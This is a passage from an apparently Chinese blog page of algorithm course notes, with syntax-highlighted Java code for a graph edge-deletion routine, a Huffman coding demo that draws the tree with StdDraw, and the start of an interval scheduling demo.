= e2[<span class="hljs-number">0</span>][i];<br>                    v2 = e2[<span class="hljs-number">1</span>][i];<br>                    <span class="hljs-keyword">if</span> (flagEOG[i] == <span class="hljs-number">1</span>) {<br>                        StdDraw.setPenColor(StdDraw.RED);<br>                        StdDraw.line(x[v1], y[v1], x[v2], y[v2]);<br>                    } <span class="hljs-keyword">else</span> {<br>                        StdDraw.setPenColor(StdDraw.BLACK);<br>                        StdDraw.line(x[v1], y[v1], x[v2], y[v2]);<br>                    }<br>                }<br>                <span class="hljs-keyword">break</span>;<br>            }<br>            <span class="hljs-type">int</span> <span class="hljs-variable">cmN</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">k</span> <span class="hljs-operator">=</span> eN - <span class="hljs-number">1</span>; k &gt;= <span class="hljs-number">0</span>; k--) {<br>                szj1 = e2[<span class="hljs-number">0</span>][k];<br>                szj2 = e2[<span class="hljs-number">1</span>][k];<br>                flag[szj1][szj2] = <span class="hljs-number">0</span>;<br>                flag[szj2][szj1] = <span class="hljs-number">0</span>;<br>                <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; vN; i++) {<br>                    flagv[i] = <span class="hljs-number">1</span>;<br>                }<br>                cmN = dft(szj1, flag, flagv, vN);<br>                <span class="hljs-keyword">if</span> (cmN == vN) {<br>                    flagEOG[k] = <span class="hljs-number">0</span>;<br>                } <span class="hljs-keyword">else</span> {<br>                    flag[szj1][szj2] = <span class="hljs-number">1</span>;<br>                    flag[szj2][szj1] = <span class="hljs-number">1</span>;<br>                }<br>            }<br>            count = <span class="hljs-number">1</span>;<br>        }<br>    }<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">dft</span><span class="hljs-params">(<span class="hljs-type">int</span> v, <span class="hljs-type">int</span>[][] flag, <span class="hljs-type">int</span>[] flagv, <span class="hljs-type">int</span> vN)</span> {<br>        <span class="hljs-type">int</span> count=<span class="hljs-number">1</span>;<br>        flagv[v]=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;vN;i++){<br>            <span class="hljs-keyword">if</span>(flag[v][i]==<span class="hljs-number">1</span>&amp;&amp;flagv[i]==<span class="hljs-number">1</span>){<br>                count=count+dft(i,flag,flagv,vN);<br>            }<br>        }<br>        <span class="hljs-keyword">return</span> count;<br>    }<br>}<br></code></pre></td></tr></tbody></table></figure><h2 id="第四章"><a href="#第四章" class="headerlink" title="第四章"></a>第四章</h2><h3 id="哈夫曼编码"><a href="#哈夫曼编码" class="headerlink" title="哈夫曼编码"></a>哈夫曼编码</h3><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.*;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HuffmanDemo</span> {<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {<br>        <span class="hljs-type">int</span> <span class="hljs-variable">rr</span> <span class="hljs-operator">=</span> <span class="hljs-number">3</span>;<br>        <span class="hljs-comment">//int count=10;</span><br>        <span class="hljs-comment">//char[] cS = {'a','b','c','d','e','f','g','h','i','j'};</span><br>        <span class="hljs-comment">//double[] dF={0.18,0.15,0.11,0.07,0.27,0.019,0.01,0.02,0.17,0.001};</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">7</span>;<br>        <span class="hljs-type">char</span>[] cS = {<span class="hljs-string">'a'</span>, <span class="hljs-string">'e'</span>, <span class="hljs-string">'i'</span>, <span class="hljs-string">'s'</span>, <span class="hljs-string">'t'</span>, <span class="hljs-string">'b'</span>, <span class="hljs-string">'n'</span>};<br>        <span class="hljs-type">double</span>[] dF = {<span class="hljs-number">0.1</span>, <span class="hljs-number">0.15</span>, <span class="hljs-number">0.12</span>, <span class="hljs-number">0.03</span>, <span class="hljs-number">0.04</span>, <span class="hljs-number">0.13</span>, <span class="hljs-number">0.01</span>};<br>        <span class="hljs-type">int</span>[] dF2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[count];<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; count; i++) {<br>            dF2[i] = (<span class="hljs-type">int</span>) (dF[i] * <span class="hljs-number">1000</span>);<br>        }<br>        <span class="hljs-type">int</span>[][] dPS = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">3</span>][count];<br>        dPS[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; count; i++) {<br>            dPS[<span class="hljs-number">0</span>][i] = dF2[i];<br>            dPS[<span class="hljs-number">1</span>][i] = i;<br>            insertHeap(dPS, i + <span class="hljs-number">1</span>);<br>            dPS[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>] = dPS[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>] + <span class="hljs-number">1</span>;<br>        }<br>        <span class="hljs-type">int</span>[][] cHT = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">4</span>][count * <span class="hljs-number">2</span>];<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; count; i++) {<br>            cHT[<span class="hljs-number">0</span>][i] = i;<br>            cHT[<span class="hljs-number">1</span>][i] = -<span class="hljs-number">1</span>;<br>            cHT[<span class="hljs-number">2</span>][i] = -<span class="hljs-number">1</span>;<br>            cHT[<span class="hljs-number">3</span>][i] = <span class="hljs-number">1</span>;<br>        }<br>        <span class="hljs-type">int</span> <span class="hljs-variable">beishu</span> <span class="hljs-operator">=</span> count * rr * <span class="hljs-number">4</span>;<br>        StdDraw.setXscale(<span class="hljs-number">0</span>, beishu);<br>        StdDraw.setYscale(<span class="hljs-number">0</span>, beishu);<br>        StdDraw.setPenRadius(<span class="hljs-number">0.005</span>);<br>        <span class="hljs-type">int</span> <span class="hljs-variable">root</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">n</span> <span class="hljs-operator">=</span> count;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">count2</span> <span class="hljs-operator">=</span> count;<br>        <span class="hljs-keyword">while</span> (count &gt;= <span class="hljs-number">1</span>) {<br>            <span class="hljs-keyword">if</span> (count == <span class="hljs-number">1</span>) {<br>                <span class="hljs-comment">//输出显示哈夫曼树</span><br>                inOrderPaint(root, cS, cHT, count2 * <span class="hljs-number">5</span>, count2 * <span class="hljs-number">4</span> * rr - <span class="hljs-number">10</span>, rr, count2 * <span class="hljs-number">1.9</span>);<br>                <span class="hljs-keyword">break</span>;<br>            }<br>            <span class="hljs-type">int</span> <span class="hljs-variable">mF</span> <span class="hljs-operator">=</span> dPS[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>];<br>            <span class="hljs-type">int</span> <span class="hljs-variable">f1</span> <span class="hljs-operator">=</span> dPS[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>];<br>            <span class="hljs-comment">//从优先队列中取出频率最小的结点</span><br>            dPS[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] = dPS[<span class="hljs-number">0</span>][dPS[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>]-<span class="hljs-number">1</span>];<br>            dPS[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>] = dPS[<span class="hljs-number">1</span>][dPS[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>]-<span class="hljs-number">1</span>];<br>            <span class="hljs-comment">//从优先队列最后结点放到第一个结点的位置</span><br>            dPS[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>] = dPS[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>] - <span class="hljs-number">1</span>;<br>            deleteHeap(dPS, <span class="hljs-number">1</span>);<br>            <span class="hljs-comment">//重新调整为新的优先队列</span><br>            <span class="hljs-type">int</span> <span class="hljs-variable">mS</span> <span class="hljs-operator">=</span> dPS[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>];<br>            <span class="hljs-type">int</span> <span class="hljs-variable">f2</span> <span class="hljs-operator">=</span> dPS[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>];<br>            dPS[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] = dPS[<span class="hljs-number">0</span>][dPS[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>] - <span class="hljs-number">1</span>];<br>            dPS[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>] = dPS[<span class="hljs-number">1</span>][dPS[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>] - <span class="hljs-number">1</span>];<br>            dPS[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>] = dPS[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>] - <span class="hljs-number">1</span>;<br>            deleteHeap(dPS, <span class="hljs-number">1</span>);<br>            <span class="hljs-comment">//从优先队列中取出频率次小的结点</span><br>            cHT[<span class="hljs-number">0</span>][n] = n;<br>            cHT[<span class="hljs-number">1</span>][n] = mF;<br>            cHT[<span class="hljs-number">2</span>][n] = mS;<br>            <span class="hljs-keyword">if</span> (cHT[<span class="hljs-number">3</span>][mF] &gt; cHT[<span class="hljs-number">3</span>][mS]) {<br>                cHT[<span class="hljs-number">3</span>][n] = cHT[<span class="hljs-number">3</span>][mF] + <span class="hljs-number">1</span>;<br>            }<br>            dPS[<span class="hljs-number">0</span>][dPS[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>]] = f1 + f2;<br>            dPS[<span class="hljs-number">1</span>][dPS[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>]] = n;<br>            dPS[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>] = dPS[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>] + <span class="hljs-number">1</span>;<br>            insertHeap(dPS, dPS[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>]);<br>            <span class="hljs-comment">//新结点加入优先树</span><br>            root = n;<br>            n = n + <span class="hljs-number">1</span>;<br>            count = count - <span class="hljs-number">1</span>;<br>        }<br>    }<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">insertHeap</span><span class="hljs-params">(<span class="hljs-type">int</span>[][] dPS, <span class="hljs-type">int</span> i)</span> {<br>        <span class="hljs-type">int</span> zj,j;<br>        <span class="hljs-keyword">if</span>(i&gt;<span class="hljs-number">1</span>){<br>            j=i/<span class="hljs-number">2</span>;<br>            <span class="hljs-keyword">if</span>(dPS[<span class="hljs-number">0</span>][i-<span class="hljs-number">1</span>]&lt;dPS[<span class="hljs-number">0</span>][j-<span class="hljs-number">1</span>]){<br>                zj=dPS[<span class="hljs-number">0</span>][i-<span class="hljs-number">1</span>];<br>                dPS[<span class="hljs-number">0</span>][i-<span class="hljs-number">1</span>]=dPS[<span class="hljs-number">0</span>][j-<span class="hljs-number">1</span>];<br>                dPS[<span class="hljs-number">0</span>][j-<span class="hljs-number">1</span>]=zj;<br>                zj=dPS[<span class="hljs-number">1</span>][i-<span class="hljs-number">1</span>];<br>                dPS[<span class="hljs-number">1</span>][i-<span class="hljs-number">1</span>]=dPS[<span class="hljs-number">1</span>][j-<span class="hljs-number">1</span>];<br>                dPS[<span class="hljs-number">1</span>][j-<span class="hljs-number">1</span>]=zj;<br>                insertHeap(dPS,j);<br>            }<br>        }<br>    }<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deleteHeap</span><span class="hljs-params">(<span class="hljs-type">int</span>[][] dPS, <span class="hljs-type">int</span> i)</span> {<br>        <span class="hljs-type">int</span> n;<br>        <span class="hljs-type">int</span> left,right,zj;<br>        n=dPS[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>];;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-number">2</span>*i&gt;n)<br>            <span class="hljs-keyword">return</span>;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-number">2</span>*i&lt;n){<br>            left=<span class="hljs-number">2</span>*i;<br>            right=<span class="hljs-number">2</span>*i+<span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">if</span>(dPS[<span class="hljs-number">0</span>][left-<span class="hljs-number">1</span>]&gt;dPS[<span class="hljs-number">0</span>][right-<span class="hljs-number">1</span>]) {<br>                j = right;<br>            }<br>            <span class="hljs-keyword">else</span> {<br>                j = left;<br>            }<br>        }<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(n==<span class="hljs-number">2</span>*i){<br>            j=<span class="hljs-number">2</span>*i;<br>        }<br>        <span class="hljs-keyword">if</span>(dPS[<span class="hljs-number">0</span>][j-<span class="hljs-number">1</span>]&lt;dPS[<span class="hljs-number">0</span>][i-<span class="hljs-number">1</span>]){<br>            zj=dPS[<span class="hljs-number">0</span>][i-<span class="hljs-number">1</span>];<br>            dPS[<span class="hljs-number">0</span>][i-<span class="hljs-number">1</span>]=dPS[<span class="hljs-number">0</span>][j-<span class="hljs-number">1</span>];<br>            dPS[<span class="hljs-number">0</span>][j-<span class="hljs-number">1</span>]=zj;<br>            zj=dPS[<span class="hljs-number">1</span>][i-<span class="hljs-number">1</span>];<br>            dPS[<span class="hljs-number">1</span>][i-<span class="hljs-number">1</span>]=dPS[<span class="hljs-number">1</span>][j-<span class="hljs-number">1</span>];<br>            dPS[<span class="hljs-number">1</span>][j-<span class="hljs-number">1</span>]=zj;<br>            deleteHeap(dPS,j);<br>        }<br>    }<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">inOrderPaint</span><span class="hljs-params">(<span class="hljs-type">int</span> root, <span class="hljs-type">char</span>[] cS, <span class="hljs-type">int</span>[][] cHT, <span class="hljs-type">double</span> x, <span class="hljs-type">double</span> y, <span class="hljs-type">double</span> r, <span class="hljs-type">double</span> jg)</span> {<br>        <span class="hljs-type">double</span> xC,yC,xS,yS,rC,zj1,zj2;<br>        StdDraw.setPenColor(StdDraw.BLACK);<br>        StdDraw.circle(x,y,r);<br>        <span class="hljs-keyword">if</span>(cHT[<span class="hljs-number">1</span>][root]!=-<span class="hljs-number">1</span>&amp;&amp;cHT[<span class="hljs-number">2</span>][root]==-<span class="hljs-number">1</span>){<br>            xC=x-jg;<br>            yC=y-<span class="hljs-number">4</span>*r;<br>            zj1=r*jg/(Math.sqrt(<span class="hljs-number">16</span>*r*r+jg*jg));<br>            zj2=<span class="hljs-number">4</span>*r*r/(Math.sqrt(<span class="hljs-number">16</span>*r*r+jg*jg));<br>            StdDraw.setPenColor(StdDraw.RED);<br>            StdDraw.line(x-zj1,y-zj2,xC+zj1,yC+zj2);<br>            inOrderPaint(cHT[<span class="hljs-number">1</span>][root],cS,cHT,xC,yC,r,jg/<span class="hljs-number">1.3</span>);<br>        }<br>        <span class="hljs-keyword">if</span>(cHT[<span class="hljs-number">2</span>][root]!=-<span class="hljs-number">1</span>&amp;&amp;cHT[<span class="hljs-number">1</span>][root]==-<span class="hljs-number">1</span>){<br>            xC=x+jg;<br>            yC=y-<span class="hljs-number">4</span>*r;<br>            zj1=r*jg/(Math.sqrt(<span class="hljs-number">16</span>*r*r+jg*jg));<br>            zj2=<span class="hljs-number">4</span>*r*r/(Math.sqrt(<span class="hljs-number">16</span>*r*r+jg*jg));<br>            StdDraw.setPenColor(StdDraw.RED);<br>            StdDraw.line(x+zj1,y-zj2,xC-zj1,yC+zj2);<br>            inOrderPaint(cHT[<span class="hljs-number">2</span>][root],cS,cHT,xC,yC,r,jg/<span class="hljs-number">1.3</span>);<br>        }<br>        <span class="hljs-keyword">if</span>(cHT[<span class="hljs-number">2</span>][root]!=-<span class="hljs-number">1</span>&amp;&amp;cHT[<span class="hljs-number">1</span>][root]!=-<span class="hljs-number">1</span>){<br>            xC=x-jg;<br>            yC=y-<span class="hljs-number">4</span>*r;<br>            zj1=r*jg/(Math.sqrt(<span class="hljs-number">16</span>*r*r+jg*jg));<br>            zj2=<span class="hljs-number">4</span>*r*r/(Math.sqrt(<span class="hljs-number">16</span>*r*r+jg*jg));<br>            StdDraw.setPenColor(StdDraw.RED);<br>            StdDraw.line(x-zj1,y-zj2,xC+zj1,yC+zj2);<br>            <span class="hljs-comment">//Sytem.out.print(" "+cHT[1][root]);</span><br>            inOrderPaint(cHT[<span class="hljs-number">1</span>][root],cS,cHT,xC,yC,r,jg/<span class="hljs-number">1.3</span>);<br>            xC=x+jg;<br>            yC=y-<span class="hljs-number">4</span>*r;<br>            zj1=r*jg/(Math.sqrt(<span class="hljs-number">16</span>*r*r+jg*jg));<br>            zj2=<span class="hljs-number">4</span>*r*r/(Math.sqrt(<span class="hljs-number">16</span>*r*r+jg*jg));<br>            StdDraw.setPenColor(StdDraw.RED);<br>            StdDraw.line(x+zj1,y-zj2,xC-zj1,yC+zj2);<br>            <span class="hljs-comment">//Sytem.out.print(" "+cHT[2][root]);</span><br>            inOrderPaint(cHT[<span class="hljs-number">2</span>][root],cS,cHT,xC,yC,r,jg/<span class="hljs-number">1.3</span>);<br>        }<br>        <span class="hljs-keyword">if</span>(cHT[<span class="hljs-number">2</span>][root]==-<span class="hljs-number">1</span>&amp;&amp;cHT[<span class="hljs-number">1</span>][root]==-<span class="hljs-number">1</span>){<br>            xS=x-<span class="hljs-number">0.05</span>*r;<br>            yS=y;<br>            String s=<span class="hljs-string">""</span>+cS[cHT[<span class="hljs-number">0</span>][root]];<br>            StdDraw.setPenColor(StdDraw.RED);<br>            StdDraw.text(xS,yS,s);<br>        }<br>    }<br>}<br><br><br></code></pre></td></tr></tbody></table></figure><h3 id="时隙最优解权值和"><a href="#时隙最优解权值和" class="headerlink" title="时隙最优解权值和"></a>时隙最优解权值和</h3><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Arrays;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ComputeRDemo</span> {<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>{<br>        <span class="hljs-type">int</span> isN=<span class="hljs-number">10</span>,gis=<span class="hljs-number">50</span>;<br>        <span class="hljs-type">int</span>[] isF=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[isN];<br>        <span class="hljs-type">int</span>[] isS=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[isN];<br>        <span class="hljs-type">int</span>[] isV=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[isN];<br>        <span class="hljs-type">int</span>[] isF2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[isN];<br>        <span class="hljs-type">int</span>[] isS2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[isN];<br>        <span class="hljs-type">int</span>[] isY2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[isN];<br>        <span class="hljs-type">int</span>[] isV2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[isN];<br>        <span class="hljs-type">int</span>[] isR=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[isN];<br>        <span class="hljs-type">int</span>[] isM=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[isN];<br>        <span class="hljs-type">int</span> beishu=gis;<br>        <span class="hljs-type">int</span>[] flagX=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[isN];<br>        <span class="hljs-type">int</span> c=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span> (c&lt;isN){<br>            <span class="hljs-type">int</span> d1=(<span class="hljs-type">int</span>)(Math.random()*beishu);<br>            <span class="hljs-type">int</span> d2=(<span class="hljs-type">int</span>)(Math.random()*beishu);<br>            <span class="hljs-type">int</span> d3=(<span class="hljs-type">int</span>)(Math.random()*beishu);<br>            <span class="hljs-type">int</span> d4=(<span class="hljs-type">int</span>)(Math.random()*beishu);<br>            <span class="hljs-keyword">if</span>(d1&gt;d2){<br>                isS[c]=d2;<br>                isF[c]=d1;<br>                isF2[c]=d1;<br>                isV[c]=d4;<br>                isV2[c]=d4;<br>                flagX[c]=<span class="hljs-number">1</span>;<br>                c=c+<span class="hljs-number">1</span>;<br>            }<br>            }<br>        StdDraw.setXscale(<span class="hljs-number">0</span>,beishu);<br>        StdDraw.setYscale(<span class="hljs-number">0</span>,beishu);<br>        StdDraw.setPenRadius(<span class="hljs-number">0.005</span>);<br>        Arrays.sort(isF);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;isN;i++){<br>            isR[i]=<span class="hljs-number">0</span>;<br>            isM[i]=-<span class="hljs-number">1</span>;<br>        }<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;isN;i++){<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;isN;j++){<br>                <span class="hljs-keyword">if</span> (isF[i]==isF2[j]&amp;&amp;flagX[j]==<span class="hljs-number">1</span>){<br>                    isS2[i]=isS[j];<br>                    isV2[i]=isV[j];<br>                    flagX[j]=<span class="hljs-number">0</span>;<br>                    <span class="hljs-keyword">break</span>;<br>                }<br>            }<br>        }<br>        <span class="hljs-type">int</span>[] isP=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[isN];<br>        <span class="hljs-type">int</span>[] isSX=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[isN];<br>        <span class="hljs-type">int</span>[] isSY=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[isN];<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;isN;i++){<br>            isP[i]=-<span class="hljs-number">1</span>;<br>            isY2[i]=(<span class="hljs-type">int</span>)(beishu/isN*(isN-i)-<span class="hljs-number">0.5</span>);<br>            isSY[i]=isY2[i]-<span class="hljs-number">2</span>;<br>            isSX[i]=(<span class="hljs-type">int</span>)((isS2[i]+isF[i])/<span class="hljs-number">2</span>);<br>        }<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;isN;i++){<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=i-<span class="hljs-number">1</span>;j&gt;=<span class="hljs-number">0</span>;j--){<br>                <span 